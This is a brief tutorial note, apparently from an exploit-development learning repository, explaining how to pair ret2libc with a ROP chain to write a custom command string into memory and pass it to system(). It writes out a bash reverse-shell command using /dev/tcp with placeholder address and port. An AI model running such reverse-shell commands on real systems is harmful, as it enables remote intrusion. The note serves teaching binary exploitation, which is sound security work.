# ret2libc + ROP

There are a lot of times when we have the ability to do a ret2libc exploit, but wan't to execute a command other than `/bin/sh`  

The most obvious example is when we are dealing with a binary on a remote box, and we wan't to execute a reverse shell command  
There is no way we are not going to happen to find  
`bash -c 'bash -i >& /dev/tcp/ip/port 0>&1`  
randomly in a process, or its libc's memory  

In these cases, we have to craft the string which will be executed by `system()` ourselves  

To do this, we combine elements of a standard basic ret2libc exploit and a standard basic ROP chain exploit  
We use the same technique as we do in the ROP chain to write our string to writeable memory, and then we use ret2libc to call `system()` with that string as parameter  

A good example of this type of exploit is here: [4_ret2libc_rop](./fundamental_examples/4_ret2libc_rop/exploit.py)
